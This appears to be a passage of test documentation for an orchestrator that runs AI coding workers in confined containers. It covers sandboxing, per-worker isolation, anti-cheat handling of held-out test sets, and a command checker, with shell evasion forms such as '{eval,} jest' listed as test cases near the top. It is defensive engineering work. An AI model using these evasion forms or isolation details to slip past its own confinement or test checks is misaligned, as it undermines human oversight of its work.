  and `test_continuations_and_comments_are_read_as_bash_reads_them`).
- **Brace expansion** (`{eval,} jest`, `{sh,} -c jest`,
  `{docker,} run img pytest …`) withholds the report in the container
  check; more shells (`rbash`) and container or remote CLIs (`oc`,
  `lima`, `colima`, `podman-remote`, `nerdctl.lima`, `lxc`, `distrobox`,
  `toolbox`, `flatpak`, `ssh`, `fly`, `gcloud`, `su`).

Eight reversions, each caught: a backtick ending any comment, no `$$` in
the stripper, a continuation clearing the boundary, no `$$` in
`_rough_words`, no `/` narrowing, no brace check, no `ssh`, and no
`lima`. A first-draft brace check in `_takes_runner_as_text`
survived its reversion — the container check already withholds the whole
report — and was dropped.

##### Review round 5 of the edge-case fixes (2026-10-07)

No HIGH or MEDIUM. Fixed:

- **A JSON value in an assignment is not a brace expansion**
  (`TS_NODE_COMPILER_OPTIONS='{"module":…,"strict":true}' npx jest`):
  bash brace-expands no `NAME=` word, so the container check skips them.
- **`$${` and `\${` open no `${…}`** in the fallback's comment pass.
- **A `/` inside a nested expansion** (`${E:-${F}/}`) is no longer taken
  for a literal one (`_outside_expansions`).
- **Commands that run as another user** (`sudo`, `runuser`, `doas`) and
  `incus`, `devcontainer`, `podman-compose`, `multipass` withhold the
  report, as `su` already did.

Five reversions, each caught. Disclosed rather than fixed, both contrived:
an unquoted expansion whose value holds a space can split a command word
(`E='eval '; $E/x jest`), and a heredoc body with an odd number of
backticks can mislead the fallback's backtick tracking. A package or
folder named like a listed CLI before the runner (`yarn workspace
toolbox jest`) loses its report.

## Launcher `--help` host fast path

`tests/test_launcher_help_fast_path.py` runs the real launcher with
`nerdctl`/`docker`/`colima`/`flyctl`/`aws` stubs that record and fail any call.
`--help`/`-h` (including with `--runtime fly|ec2`) must exit 0, print exactly
the orchestrator's own `--help` text (so a new flag needs no extra step), call
no stub, print no `finalize` line, and write nothing under `$HOME`; a `--help`
after `--` is not help (and exits non-zero), `prune --help` keeps its own
usage, and a PATH with no `python3` yields one error line and exit 1 rather
than a fall-through to the run path. Six of the eight tests fail against the
pre-change launcher.

## Launcher end to end against a stub `nerdctl`: keepalive, signals, `--`, top level

`tests/launcher_stub_run.py` runs the real launcher with a stub `nerdctl`
(shell builtins and absolute paths only) whose `run` records its argv and
"runs the container" as a `sleep` that `kill` ends. Every process a launch
starts carries a unique `LEERIE_TEST_MARK`, and each test kills whatever
still carries it in `finally`. The world, not the host, decides the
launcher's AppArmor gate: a stub `cat` answers the three files the probes
read (the LSM list, the loaded profiles' names, the installed profile; their
paths read from `scripts/runtime-install.sh`) from the world, and passes
every other `cat` to the real one. `make_world(apparmor=)` is `current`
(the default), `none` or `stale`.

- `tests/test_launcher_stage_keepalive.py` (review round 26 M1): with stdout
  on a pipe, the reader gets EOF within 15 s of the launcher's exit and no
  marked process is left. The keepalive as shipped, sent TERM, takes its
  `sleep` with it.
- `tests/test_launcher_signal_stops_run.py` (review round 27 O1): TERM and
  INT to the launcher during a 300 s container exit 143 / 130 within 20 s,
  after `nerdctl kill`, with the client gone and the cidfile removed. A
  TERM in the created window (the cidfile written, the task not started)
  ends the launcher with 143 within 5 s, and the container never starts.
- `tests/test_launcher_double_dash.py` (review round 27 O3): `--no-push --
  <task>` for `-task`, `--no-push` and `--state-dir` hands the container
  every flag before `--` and `-- <task>` last. `-- --no-push` is a task, not
  a push opt-out. A source rule requires every top-level `for arg in "$@"`
  scan to handle `--`.
- `tests/test_launcher_repo_top_level.py` (review round 27 O4): from
  `<repo>/sub`, `/work` is the top level, `USER_REPO` its name, and the
  default state dir is keyed and owned by it. A relative task file and
  `--answers` under `sub/` reach the container as `sub/...`, and a task file
  only at the top level is not found from `sub/`. At the top level nothing
  is rewritten.

Twelve of these fourteen tests fail against the previous launcher, each on
its own defect (output is written to a file, not a pipe, so the keepalive's
orphan cannot time out the others). The two that pass on both are controls:
the missing task file from `sub/`, and nothing rewritten at the top level.

`tests/test_launcher_stub_run_apparmor.py` (4 tests) drives each world state
through the real launcher and its real probes: `current` hands `nerdctl run`
`seccomp=unconfined` and `apparmor=leerie-container`, `none` only the
first, `stale` stops with "not loaded (or is stale)" before `nerdctl run`,
and an unknown state is refused. Before the stub, every test running the
launcher through this harness read the host's securityfs and
`/etc/apparmor.d/`, and passed only where the loaded profile was this
checkout's. Measured 2026-11-03 on a host whose loaded profile was older:
13 of the harness's 16 tests (the four files above and the relay test in
`tests/test_terminal_text.py`) failed, every one that reaches the gate.
With the stub's call removed, 3 of the 4 fail on that host (`current`,
`none`, the refusal); the states disagree, so on any host at least two
fail.

## Launcher `list` / `--report` host path and bash 3.2 parse

`tests/test_launcher_readonly_host_path.py` runs the real launcher against a
tmp `$HOME` holding one finished run, with failing `nerdctl`/`docker`/`colima`/
`flyctl`/`aws` stubs on PATH. `list` (with `--status`, `--runtime`), and
`--report` (bare, with an id, `--report=ID`, with `--run-id`) must exit 0,
print byte-for-byte what the orchestrator prints for the same state root, call
no stub and print no `finalize` line. `--state-dir` (launcher-only) must be
honored and not leaked to argparse. Two fallback tests pin that the allowlist
is closed: an unlisted flag, or no `python3`, keeps the container path. Ten of
the twelve tests fail against the previous launcher; the two fallback tests
pass on both.

`tests/test_launcher_bash32_parse.py` has a static scan that runs on every
platform (no apostrophe in a heredoc body nested in `$(`, with an anti-vacuity
floor on how many such heredocs it finds) and `/bin/bash -n leerie`, which runs
only where `/bin/bash` is 3.2 and skips on CI. Two of its three tests fail
against the previous launcher on a Mac; only the static scan is visible to CI.

## B\* verdicts, the shared re-drive budget and the run outcome

`tests/test_bstar_confirm.py` covers B\* (DESIGN §9 *Which failures are
new*): the host PSI reader and gate (the gate is pinned to
`/proc/pressure/cpu`, paired with a test that the default reader is the one
called), the per-ID verdict (interleaved base-first pairs, a flake or a
base failing on some reruns is `resource_affected`, a base failing every
rerun is `pre_existing`, a gate timeout or an unreadable PSI file
escalates to 5 pairs, the budget cuts pairs short), the report parser,
and end-to-end runs against a real pytest suite in a real git repo (the
`e3_repo` fixture) — among them one real regression confirmed new while an
alternating flake is typed `resource_affected`. One of them executes
`_run_final_conformance` (`test_final_loop_continues_only_on_a_confirmed_new_failure`): with
the `tests` axis red on every round, the loop stops after one round when no
ID is confirmed new, and spends every round when one is.

Review round 6 H1 (a budget shortfall is unsettled, not `new`): the same
file pins that a candidate with no finished base/final pair is
`budget_short_unsettled` (`test_a_rerun_ending_past_the_budget_with_no_verdict_is_not_a_run`,
rewritten from the zero-rerun `new` it used to pin), that a discovery find
is never new on a shortfall, that `confirm_budget_sec = 0` runs no gate and
no rerun, `_confirm_select`'s ranking and sizing, both empty-base-list
callers of the final diff (a scoped command, unknown baseline IDs — review
round 6 D-H3), a file sized out of the final diff, and the as-written retry
bounded by what is left (review round 6 C1).
`tests/test_bstar_one_off_flake_budget.py` is the reviewer's end-to-end
driver turned regression test: a one-off flake in a file too slow for one
pair ends `done` with a "could not confirm within the budget" entry in the
PR's "Needs human verification", and with a budget that fits the pairs it
is `resource_affected` with no entry. `tests/test_ci_parity.py` pins the
CI side (a slow red check is unsettled, a long check is sized out so it
cannot starve a short one), `tests/test_integration_repair_loop.py` that an
unsettled merged-tree failure is never a `test_failure`, and
`tests/test_delivery_ratchet.py` that an unsettled re-drive candidate
leaves the execution items unchecked, never a rollback.

`tests/test_redrive_test_id_diff_refresh.py` (review round 6, the stale
row after a re-drive, driven and fixed): on a real pytest suite a test
confirmed new at detection and then fixed by a re-drive group is measured
again on the shipping tree (`_redrive_refresh_test_id_diff`), so the row
reads met and the run `done`; when the tree cannot be measured the diff is
marked `stale_for_tree` — its `new` still counts, named as of an earlier
tree, and with none the row reads unknown, never met. A third test pins
that the re-drive's end-of-pass block refreshes before re-checking items.

`tests/test_acceptance_held_case_intermittent.py::test_a_vote_file_seen_failing_only_by_a_timeout_is_unsettled_not_failing`
(review round 6, driven and fixed): a held-out vote file whose first run
timed out and whose every rerun the budget cut is unsettled and the set
unmeasured, not failing; the assertion-failing control beside it stays
failing under the same cut.

`tests/test_acceptance_unmeasured_pr.py` (review round 7 M3, driven and
fixed; DESIGN §8 *A held-out set the final tree leaves unmeasured is never
silent*): every cause an evaluation can end a held-out set unmeasured —
a first-run timeout / signal death with every rerun cut, no rerun verdict,
reruns that disagree, no runner verdict, a path already in the tree,
placement, commit, worktree, dependency install and evaluation failures —
records its code on the result and reaches the PR under "Needs human
verification" with the outcome still `done`; so do valid sets with no
final verdict and a re-measure of the shipping commit that measured
nothing (`final_unremeasured`). Broken and variant sets are not listed; a
measured set records no code. A derivation guard checks the
`ACCEPTANCE_UNMEASURED_WHY` vocabulary both ways, and a real hanging
pytest file pins `timed_out`. The reviewer's driver itself is
`tests/test_acceptance_held_case_intermittent.py::test_a_timeout_only_vote_file_is_named_in_the_pr`.

`tests/test_redrive_budget.py` drives `phase_execute` (DESIGN §13 *One
re-drive budget per subtask*): a blocked subtask is re-driven with its
blocker as the note and at most `subtask_redrive_rounds` times, then settled
`unconverged`; a `failed` one is never re-driven; a spent run budget or a
counter already consumed stops every re-drive; dependents of an unconverged
subtask settle without running; and the resume filter skips
`unconverged`/`accepted_external`. The default auto-accept test in
`tests/test_phase_execute_wave_flow.py` was rewritten to the unconverged
settle.

`tests/test_decide_outcome.py` covers `_decide_outcome` (each unfinished-work
signal unconverges a run with or without commits — the ordering the P7
decider requires — an AST pin that it is the only writer of `outcome`, the
empty-branch `_finish_no_work_run` exit, and an execution of
`phase_finalize` recording the outcome in `run.json`).
`tests/test_host_finalize_sh.py` pins `--draft` on `unconverged` only.

## Settle by execution, spawn-held enrollment and measured sizing

`tests/test_settle_by_execution.py` drives the real `_settle_by_execution`
(DESIGN §8 *Settled by execution*) in a real git worktree with real child
processes, the broker and the pressure gate stubbed: the
`verification_only` truth table (one argv-less criterion refuses the label),
a bracketed path reaching the command as a literal argument (paired with a
`bash -c` control that glob-expands it), a failure re-checked
`confirm_pairs` times (escalated on a gate timeout), a flaky failure passing
as `resource_affected`, a command that rewrites a tracked file failing and
being reverted, a dirty worktree never run over, a cgroup kill at the
measured ceiling typed `environment_limit` without a re-check (an ordinary
failure below it), only build/test argvs taking a build slot, and the
re-drive blocker fencing output as data. The `_settle_subtask` arms are
executed in `tests/test_settle_subtask_branch_coverage.py` (verification-only
no-commits settles by execution; a failing execution or a
non-verification-only claim is `blocked` for the shared budget, the HEAD
probe never asked) and `tests/test_declared_commands_executed.py` (the
`empty_handoff` rescue settles by execution once, or is blocked — the
warning-only settle was rewritten). The wiring guards in
`tests/test_mid_run_satisfied_no_commits.py` were rewritten to the new
placement: the HEAD probe survives only before the implementer.

`tests/test_settle_decided_by_execution.py` (6 test functions, 11 cases;
DESIGN §8 *A no-op a sibling already delivered is settled on evidence*,
check 3; the live 54fb56c3 bugfix-006 episode; review round 39, execution
E1) builds the live repository shape (a `leerie: integrate bugfix-004`
merge on the run branch) and drives the real `_settle_subtask` with the
live execution record and probe verdict: the subtask settles `complete`
with `decided_by: "execution"`, `_unconverged_predecessors(...,
bugfix-010)` is empty, and the payload carries `decided_by_execution`
with each criterion's id. `cannot_verify` counts only when execution
decided everything the probe could not check (6 cases, each re-driven:
`partially_met`, an untyped verdict, a criterion with no command, a
verdict without the `unverifiable`/`covered_by_execution` lists, the seed
uncovered, an unknown id). A control: a failing verify is re-driven
twice, then settles unconverged and holds bugfix-010 back. A unit test
of `_execution_decides_criteria`; a unit test of
`_execution_answers_cannot_verify`'s set rule; and the E1 reproduction,
untrimmed (12 files, an argv over 2, a file outside it broken, the probe's
`covered_by_execution` empty), which must re-drive. Falsified
(2026-11-04): the set rule replaced by `return True` fails the
reproduction, the seed-uncovered and unknown-id cases and the unit test;
and, before E1's fold, the `_execution_decides_criteria` condition
removed failed the uncommanded-criterion case.

`tests/test_spawn_held_enrollment.py` spawns real processes through
`_run_streaming`: at the moment the broker would enroll, after a pause long
enough for an unheld child to have finished, the command has not run; the
enrolled pid is the command's own; an interrupted enroll never runs it; the
gate refuses anything but the release byte. `_invoke` is executed with the
spawn mocked: create, spawn (the worker argv behind the gate, its read end in
`pass_fds`), enroll, release — in that order — and a failed spawn destroys the
pre-created cgroup. An AST-level guard pins `_invoke` and `_run_streaming` as
the only enrollment sites.

`tests/test_build_peak_sizing.py` covers F1 sizing: the benched funeralworks
peak (17.81 GiB / 2852 PIDs) yields the benched 22.56 GiB / 4278-PID caps;
caps only rise; the slot count floors at one; slots are shared through the
host directory, a slot held by another process makes the acquirer wait until
that process is killed, a read-only slot file still locks; only the build and
tests axes take a slot; the baseline measures every axis uncapped and raises
the caps, and a resumed baseline re-applies without re-measuring; and the
environment-limit retry-then-unconverged. Its rootless-shape test (an
`unshare --user --map-user` child locking a slot in the outer user's
directory) skips where unprivileged user namespaces are disabled.
`tests/test_host_dir_ownership.py` pins the `.host` mount: the launcher
creates and mounts it after the `LEERIE_*` forward, and the real rootful
guard, executed with `chown` faked, chowns `/leerie-host` (the directory
only) under rootful and nothing under rootless. `tests/test_cgroup_broker.py`
and `tests/test_broker_wire_contract.py` cover the broker's `peak` verb and
its parse in `_cgroup_peak`.

## Held-out sets at own start, every failing set repaired, scoped runners

`tests/test_acceptance_own_start.py` (DESIGN §8 *The validity tree is the
run's own start*, *Written whenever the defect-scope audit ran*, *A set typed
broken is not handed on*, *Scoped runners for every runner leerie can read*;
§5 *`applicable: false` is honoured only when three samples agree*) runs the
real writer/validation/evaluation code against real git repos and a real
pytest command, `claude_p` stubbed and the host PSI pinned quiet:

- **A1.** Sets are written and validated at the run's own start while an
  earlier same-task run started on an older tree (the writer's HEAD is the
  own start; `report_reproduced` is True there, False where the older base
  passes); the writer's clone has no ref, no remote and cannot reach an
  earlier run's fix, and a failed clone falls back to a worktree, logged.
  Per case: one failing case among passing ones keeps a defect file (its
  failing IDs recorded), and a session hook forcing exit 1 with every case
  passing no longer discards a control.
- **A2.** One failing set of three fails (`_acceptance_any_fails`, which
  replaced the majority rule — its tests in `test_acceptance_gate.py` and
  `test_acceptance_no_work.py` were rewritten, including a passing-majority
  settle that now disputes); a set that fails once and then passes its B*
  reruns is `resource_affected` and no evidence, a consistent failure is
  confirmed; `_confirm_still_failing` needs every rerun (with `seen_failing`,
every finished one, unless the candidate is in `needs_rerun` and none
finished) and escalates on a
  gate timeout; HEAD at the validity base is answered without running the
  sets; a set typed broken leaves the next run's residual (all broken: no
  residual), and a residual without set indices is kept.
- **A4.** `_infer_scoped_test_template` over bare pytest/rspec/minitest/go/
  cargo commands and the typed `no_scoped_runner` reasons for everything
  else; `{test_packages}`/`{test_targets}` rendering and their absence rule;
  pytest inferred by `resolve_blt_scoped` (the `test_scoped_axes.py`
  "infers nothing" test was rewritten); the go `-run` selector and report
  request; cargo's `RUSTC_BOOTSTRAP`; rspec and minitest report requests
  (the plugin written); per-case statuses from the real C9 bench reports of
  every runner (`tests/fixtures/runner_reports/`); a go package that never
  built is a load error; B*'s JUnit IDs keep their shape.
- **N1-L.** Sets are written when the audit said not applicable (no contract
  in the payload), none when no audit ran; no scoped runner is a loud typed
  skip; `applicable: false` needs three agreeing samples, a crashed sample
  being no vote.

## N3: wiring fan-in, the integration repair loop and overlap prevention

`tests/test_wiring_fanin_fallback.py` covers `_fanin_and_fallback` through
`_repair_missing_requires` (DESIGN §5 *What is left after that is ordered,
not refused*): providers in two clusters get a fan-in `requires` and
`_schedule` then orders the subtask behind both; a descendant provider is
skipped by the `depends_on` fallback with the graph still acyclic; every
provider a descendant, nothing providing the value, and `missing_provides`
are typed warnings; and `phase_wiring_gate` persists the warnings and dies
only on a sid not in the plan. The channel tests in
`tests/test_wiring_gate_repair.py` (each "declines" case and the
already-ordered re-check) now target `_repair_wiring_channels`, the stage they
pin; the gate-level die tests there and in `tests/test_phase_wiring_gate.py`
were rewritten to the warning, keeping a die on an unknown sid so the
severity pins still have a gate to observe.

`tests/test_integration_repair_loop.py` executes `_run_integration_judge_gate`
against a real two-parent merge in a real git staging tree, only `claude_p` and
the conflicted-area test run stubbed (DESIGN §6 *When integration cannot
succeed*): a clean verdict keeps the merge; a finding is repaired in the order
judge → integrator → re-judge, the re-judge reviewing a synthetic merge of the
repaired tree over both parents, drawing one round from `redrive_rounds`; an
`intent_conflict`, a spent shared budget, a `design-conflict` during repair and
exhausted rounds each reset staging to the merge's first parent and settle the
subtask `unconverged`; a round with no new commit is reset and spent; a
confirmed test failure blocks the pass and reaches the next round typed, with
the stale list; residual content loss is recorded unless a `superseded`
entry's `by_line` is at HEAD. `_integration_dropped_lines` is run on real
diffs (S3: a conflict-hunk drop stays listed), `_conflicted_area_tests` on a
real repo (one-hop importers), and `_integration_test_failures` with the
runner stubbed per tree (a parent failure is no candidate; a B\*-unconfirmed
candidate is no failure; routing by the overlay). The detect-and-die tests in
`tests/test_integrate_wave_judge_gate.py` were rewritten on a real merge: the
wave continues past a backed-out subtask, the verdict is on disk before the
repair integrator spawns, and a resume re-enters the loop without
`integrate.sh`. `tests/test_integration_judge_coverage.py`'s source pins
follow the filters into `_integration_defect_records` /
`_integration_judge_verdict`.

`tests/test_schedule_overlap.py` covers `_serialize_planned_overlap` through
`_schedule` (split, cap 0, the cap counted over the whole plan, largest overlap
first, predecessor order kept, `./` normalised, both `_run_phases` call sites
passing the cap). `tests/test_json_key_merge.py` covers `_json_key_merge3` and
`_try_json_key_merge` on real git conflicts: an i18n conflict is committed as
the merge with both sides' keys and the file's formatting; a key conflict or a
non-JSON file in the conflict leaves the merge exactly as git left it.

**The AST-script tests run on CI, not only where `typescript` happens to
resolve.** `scripts/test-case-facts.cjs` (the falsifier's coupling facts,
`tests/test_delivery_detection.py`) and `scripts/redrive-ast-gate.cjs` (the
delivery re-drive's escalation gate, `tests/test_delivery_redrive.py`) load
`typescript` from the tree they run in (else from the image's bundled copy,
which a host test run does not have), so both skip on a host where node cannot
resolve it — which was every CI run.
`.github/workflows/test.yml` now installs a pinned `typescript` under
`$RUNNER_TEMP` and exports `LEERIE_TEST_TYPESCRIPT_DIR`. A set
`LEERIE_TEST_TYPESCRIPT_DIR` is binding: the tests use it as given, so a
broken install fails them instead of skipping them, and
`test_ci_provisions_the_typescript_the_ast_tests_need` fails on CI
(`GITHUB_ACTIONS=true`) when the variable is unset or names nothing node can
load. To run them locally: `npm install --no-save --prefix <dir> typescript`
and point the variable at `<dir>/node_modules/typescript`.

**A TypeScript 7 tree parses with the bundled compiler.** The native port's
`typescript` package resolves but exports a version string only, so the AST
scripts used to crash on `ts.ScriptTarget` and every falsifier sample on such
a repo read as rejected. `scripts/load-typescript.cjs` loads the tree's own
copy only when `typeof ts.createSourceFile === 'function'`, else the pinned
copy at `BUNDLED_TYPESCRIPT`. `tests/test_delivery_detection.py` builds a fake
TS7-shaped package (`_ts7_tree`): without a bundle `_ts_resolvable` is False
and `_probe_case_facts_placed` (the probe placed in a held-out sandbox)
returns `facts_failed`; with `BUNDLED_TYPESCRIPT`
pointed at the test's typescript the loader reports `bundled` and the facts
come out; `tests/test_delivery_redrive.py::TestAstGate::test_ts7_tree_runs_on_the_bundled_typescript`
does the same for gate (d+). `TestFalsifierGates::test_a_facts_script_failure_is_its_own_gate_not_a_rejection`
pins `facts_read: false` with no `assertion_in_case` / `not_coupled`, and
`test_the_image_ships_the_bundled_typescript_where_leerie_looks` pins the
Dockerfile's extraction path to the constant.

## I3: a held-out set never enters a tree a worker commits from

`tests/test_redrive_selfcheck_out_of_tree.py` (DESIGN §8 *A held-out set
never enters a tree a worker commits from*) runs the real self-check
command (`bin/leerie-selfcheck` → `scripts/selfcheck.py` →
`selfcheck_main`) with real pytest on a repository whose state root sits
inside it: the verdict follows the worker's uncommitted edit, the ignored
helper package is shared, a set file under an ignored directory is placed
in a real directory of the copy (never through the link into the worker's
tree), git run by a test finds no enclosing repository, a subset by file
name and a `-t` filter run, a set path the tree already has is refused
(exit 3), and no set file or byte is left in the worker's tree. A whole
`_run_delivery_redrive`, its implementer stubbed to put a copy of the shown
set in its tree and run the command, leaves no byte of a shown or held-back
set in `git cat-file --batch-all-objects`. Thirteen tests in all: the
real-command test, nine argument cases (path, file name, unique path
suffix, an ambiguous name, pass-through), a SIGTERM mid-run that still
deletes the copy, the object-store test, and a dash-led file name the
copy's `tar` reads as a file, never an option. Live-falsified six ways, each
failing a test: sharing a set file's ignored parent, dropping
`GIT_CEILING_DIRECTORIES`, snapshotting through a temporary index (`add
-A`), removing the signal handlers, selecting by file name only (no
suffix), and killing only the runner instead of its process group.
`tests/test_heldout_bytes_never_reach_history.py` keeps the anti-cheat
history check (spans of the shown sets' source in any commit void a
group); its staging and unstage tests went with the staging.

## A worker that does not commit never runs in a tree leerie measures

`tests/test_pr_review_runs_outside_staging.py` (DESIGN §8, review round 15
M1): the reviewer's driver (`test_zz_r15e_pr_review_leftover_dies.py`)
inverted — the real `_run_pr_review` with a worker that leaves a file in a
read-only directory, a dangling symlink or a nested repository, then the
real `_run_final_conformance`, which now runs its conformer instead of
`die()`ing; the reviewer reads staging's installed dependency through
`_judge_checkout(share_ignored=True)`; `_ci_discover` and
`_integration_judge_verdict` run in their own checkouts. Tests that fake
git with a made-up commit use `tests.conftest.judge_checkout_in_place`.
`tests/test_payload_only_workers.py` (7 tests) drives `capture_repo_deps` and
`_compose_pr_via_llm` through the real `claude_p` (`_invoke` stubbed) and
reads the argv and cwd: an empty `<run_dir>/payload-only/`, `--allowedTools
Read`, never the repo root, with and without `dangerously_skip_permissions`.
It covers the post-run skills too: `_judge_capture` and `_request_patch`
run payload-only the same way, and `_replay_capture` reads a ref-less
`--shared` clone of its repository at HEAD (`_ref_less_clone`) — HEAD's
files only, removed with the replay's temporary directory — never the
checkout, whose uncommitted file stays untouched.

## A host that cannot build the sandbox runs the suite green

`main()` runs `_require_confinement` on every entry, and a host that
restricts unprivileged user namespaces (a developer host, CI's
ubuntu-latest) cannot build the sandbox it requires. `tests/conftest.py`'s
autouse `_no_real_heldout_sandbox` stubs `_require_heldout_sandbox` in the
pytest process and, through `tests/no_real_heldout_sandbox_site/sitecustomize.py`
first on `PYTHONPATH`, in every Python child a test starts (the 15
real-`main()` children of `tests/test_credentials_never_outlive_the_run.py`
were red without it). `tests/test_no_real_heldout_sandbox_site.py` (2
tests): a child's entry (`_require_confinement`) passes on such a host, and a
`real_heldout_sandbox` test's child keeps the real gate. Falsified: with the
`PYTHONPATH` entry dropped, those 15 and the first test are red.

## A worker cannot change another worker's environment

`tests/test_worker_config_isolation.py` (6 tests, DESIGN §6 *Each worker's
own configuration and temporary directories*) drives the real `claude_p`
and `_invoke` against a stub `claude` that acts as the CLI does where it
matters: no credentials in its configuration directory means no session,
it runs the `SessionStart` hooks that directory's `settings.json` names,
it writes its transcript under `projects/`, and it resolves its temporary
directory as Node's `os.tmpdir()` does (`TMPDIR`, else `/tmp`). A hook one
worker plants never runs in the next; both read the operator's credentials
and settings from their own copies of the run's template, which leaves out
per-session state; the template's directories reach each worker as links
to one read-only copy, which a worker cannot write; each worker has its
own `TMPDIR`, gone once the call returns; a `--resume` runs in the
directories that hold its session; and `_remove_worker_dirs`
removes them all and the template. Falsified, each turning a test red: one
shared `<wid>`, `CLAUDE_CONFIG_DIR` or `TMPDIR` left unset, the resume
lookup bypassed, the `tmp` removal dropped, an empty `_CLAUDE_CONFIG_SKIP`,
directories copied instead of linked, the template left writable, and the
template kept at finalize.

`tests/test_confined_cli_env.py` (8 tests, DESIGN §6 *Every confined CLI is
given its own directories, by one builder*; review round 22 exec H2). The
rule: every function that derives a CLI's grant or builds its argv
(`_worker_grants`, `_contained_claude_argv`, in `leerie.py` and
`scripts/*.py`) calls `_confined_cli_env`, and `_worker_dirs` has no other
caller. The behaviour, after `_use_run_tmp` and with `CLAUDE_CODE_TMPDIR`
inherited from the orchestrator: preflight's smoke test and a `claude_p`
worker, each through the real `_invoke` and the Landlock shim against a stub
`claude` that makes `$TMPDIR/claude-<uid>` first as the CLI does, and the
Fly integrator's environment and shim argv as `worker-guard.py` prints them,
each give their CLI no path in the state root outside its grant and every
`_WORKER_ENV_DIRS` variable inside what it writes; `worker-guard.py`
without a `<wid>` refuses to confine. Falsified, each turning tests red: the
smoke test's environment dropped (the stub's `mkdir` fails as in the
finding), `claude_p`'s old hand-built four variables, and the old
`worker-guard.py`. A real smoke test (`claude` 2.1.316 in `leerie:r22`,
rootless, `apparmor=leerie-container`) passed with the fix and died with the
finding's EROFS without it. A worker's TMPDIR is
`PRIVATE_TMP_ROOT/<16 hex>`, 0700, registered for removal at the process's
exit, granted, and removed by `_remove_worker_dirs`; a tsx-shaped
`<TMPDIR>/tsx-<uid>/<pid>.pipe` binds as an AF_UNIX socket from a run
directory as deep as the container's (DESIGN §6 *A worker's temp directory
is short and private too*).

## The CLI's own git, transcripts apart, and a run that died (review round 22)

`tests/test_clis_own_git_is_leeries.py` (10 tests, DESIGN §6 *The CLI's own
git runs on leerie's terms*; review round 22 isolation H1). A stand-in CLI
runs `git` by name from its `PATH` at session start, as the real one does;
the shim, grants, `worker-shell.py`, `scripts/cli-git.py`, `_invoke`, the
settings and `.git` pointer restore (`_ready_tree_for_worker`), `_tree_dirt`
and the transcript readers are real. A clean filter the last worker planted
never runs for the next worker's CLI; a filter a worker defines for its own
CLI runs nested, so it cannot reach the CLI's stream; `_cli_git_env` names
leerie's repository; the shim passes a worker's own git through and fails
closed; a `.git` rewritten mid-session is not followed; and the Fly
integrator's CLI (`collect-subtrees.sh` → `worker-guard.py`) gets the same.
Since review round 23: no settings layer below leerie's steers the CLI's git
(`test_no_settings_layer_below_leeries_steers_the_clis_git`, composed and
uncomposed: an operator's or a repository's settings `env.PATH`, prefix or
`LEERIE_*` variable still goes through `scripts/cli-bin`), and `_invoke`'s
pin lays leerie's values over the settings env
(`test_the_pin_lays_leeries_values_over_the_settings_env`).

`tests/test_transcripts_apart_from_command_logs.py` (5 tests, DESIGN §8
*What a worker ran is read from its own transcript*; review round 22 H4).
The acceptance writer's transcript and its set's validation log were one
file. Now every worker's transcript is in its log directory's
`transcripts/` (`_worker_log_path`, `_transcripts_dir`), and a command log
of the same name is another file; nothing but the transcript functions names
that directory; `_run_streaming` refuses any path in it, registered or not;
and `_write_acceptance_set`, through the real `claude_p` → `_invoke`,
validates its set beside its writer's transcript. Fixtures that hand-write a
transcript use `tests.conftest.transcript_path` and
`register_worker_transcript` — `tests/test_final_diff_measured_once.py`'s
two among them since review round 23 C6, which made its Bash-versus-Write
parametrization able to tell the two apart (falsified: a clean-tree check
that counts only files a `Write` named fails the `Bash` case alone; with
the old unregistered `logs/<sid>.log` both cases failed alike).

`tests/test_main_exception_arms.py::TestListShowsADeath` (4 tests, DESIGN
§6 *A run that died says so*) drives the real `main()` and reads `leerie
list`'s status and `run.json`'s `failed_at`: a `die()` lists `failed` with
`finished_at` and `failed_at` both set; a worker error and an unhandled
exception list `failed`; a pause, an interrupt, a clarification exit and a
clean exit record nothing; and a resume that ends cleanly clears the last
invocation's `failed_at`.
`TestEveryExitOfTheRunIsSeen` (4 tests, review round 23 C1): by rule,
`_record_run_died` has one caller, `_records_the_run_death`, which
decorates `main()`; the arm (`_own_the_run_death_record`) follows the
`State`'s acquisition with only the layout refusal between, disarmed for
`--phase` and for a `resume` of a run `_run_has_nothing_left` calls
complete; and no `sys.exit`/`os._exit` follows the arm, so a pause is
returned rather than raised. By execution, the reviewer's proof inverted: a
resume that `die()`s at the confinement entry, or in a resolver before the
`try:` around `_orchestrate`, lists `failed` and is not auto-picked, and an
interrupt at the entry records nothing. Falsified: the arm moved below
`_require_confinement` turns the rule and the entry case red; a pause
`sys.exit`ed again turns the rule and the pause case red.
`TestACompletedRunStaysCompleted` (3 tests, review round 24 L1, real
`main()` and a real resolver): a finished run's no-op resume dying in a
resolver stays `done` with no `failed_at`; a run with work left lists
`failed` after the same death; a died finalize is work left.

## Run choices on resume, and a phase-1 death resumes (review round 23)

`tests/test_run_choices_on_resume.py` (38 tests, DESIGN §6 *A resumed run
continues under the choices it was started with*; review round 23 exec, run
A′). Real `main()` runs a fresh run (`--no-push`, a cap, a per-worker model
and effort, a skip flag, `--source-of-truth`) through the real `_run_phases`
seed, then `resume` with an env that disagrees with every recorded choice:
the resume runs under the recorded values; a flag on the resume overrides
one cap and leaves the others, and is recorded in `run_choice_overrides`;
`--model` on a resume gives every model, `judge`/`heal`/`pr_writer`/
`dep_capture` included, the flag's value even with each worker's own
`LEERIE_MODEL_*` env set otherwise (review round 24 F2); `--push` overrides
a recorded `no_push` and `--no-push` wins over it; a run recorded before
`no_push` falls back to `run.json.no_push`. Host side (jq-gated): the real
`host_finalize` does not push a `--no-push` run resumed with no flag, and
a `--push` control does. The launcher's real `NO_PUSH` block, sliced from
`leerie`: the record wins over the ambient env, `--push`/`--no-push`
override, a fresh run ignores a record, no record falls back to env. The
pure `_continue_run_choices`. Rule tests: every orchestrator option is in
exactly one of the three classes; every §2½ flag and knob has a row; the
spec's sticky rows equal `RUN_CHOICES_STICKY`; each orchestrator option has
the same class in the spec and the code; nothing in `main()` reads a sticky
choice before the continuation (review round 24 F4). Falsified: the
continuation and the launcher's record step dropped turned 6 tests red; an
unclassified dest, a spec row reclassified, and the
`dangerously-skip-permissions: ON` log moved back above the continuation
each turned their rule red. `TestABareResumeReadsThePickedRunsRecord` (5
tests, review round 24 L2): the launcher's real bare-resume block reads the
run `resolve_run_id` picks, over three runs whose records disagree; the
picked record beats the ambient env; nothing to pick falls back to env; a
remote runtime does not pick host-side.
`TestRunJsonNoPushHasOneWriter` (4 tests, review round 25 F3):
`run.json.no_push` has one writer, `_record_run_push_choice`, which writes
the run's push choice or `true` while the run has nothing to push. A plain
resume of a no-work run whose choice is push keeps `no_push` true; a
control with work left takes the choice; by rule (AST), only that function
calls `_write_run_json` with `no_push`, and only `_finish_no_work_run`,
